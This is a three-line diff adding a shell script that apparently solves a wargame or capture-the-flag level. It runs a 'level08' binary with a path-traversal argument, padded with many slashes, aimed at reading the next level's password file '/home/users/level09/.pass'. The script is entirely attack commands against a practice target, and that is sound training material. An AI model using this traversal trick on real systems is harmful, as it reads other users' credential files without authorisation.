@@ -1,0 +1,3 @@
+mkdir /tmp/password
+./level08 "../../../../tmp//////////////////////////////////////////////////////////////////////password/../../home/users/level09/.pass"
+cat /tmp/pass
